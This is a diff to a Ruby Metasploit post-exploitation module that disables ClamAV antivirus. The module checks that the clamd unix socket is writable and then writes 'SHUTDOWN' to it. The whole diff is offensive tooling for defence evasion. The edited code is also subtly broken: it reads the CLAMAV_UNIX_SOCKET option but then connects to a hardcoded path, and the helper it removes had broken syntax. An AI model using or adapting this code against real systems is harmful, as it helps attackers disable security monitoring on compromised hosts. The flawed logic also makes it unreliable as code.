@@ -2,7 +2,6 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 require "socket"
 class MetasploitModule < Msf::Post
   Rank = ExcellentRanking
@@ -40,23 +39,18 @@ class MetasploitModule < Msf::Post
     )
   end
 
-	def check_unix_socket_writable
-		if writable?("#{clamav_socket}")
-			print_good("file does exist and is writable!")
-			return true
-    print_bad("file is not writable!")
-    return false
-	end
-
   def run
     clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
     print_status("Checking file path #{clamav_socket} exists and is writable... ")
-		if check_unix_socket_writable
-      Socket.unix("#{clamav_socket}") do |sock|
-          print_status("Shutting down ClamAV!")
-          sock.write("SHUTDOWN")
-      end
+		if writable?("#{clamav_socket}")
+			print_good("File does exist and is writable!")
+
+      Socket.unix("/run/clamav/clamd.ctl") do |sock|
+        print_status("Shutting down ClamAV!")
+				sock.write("SHUTDOWN")
+			end
 			return true
     end
 	end
+
 end
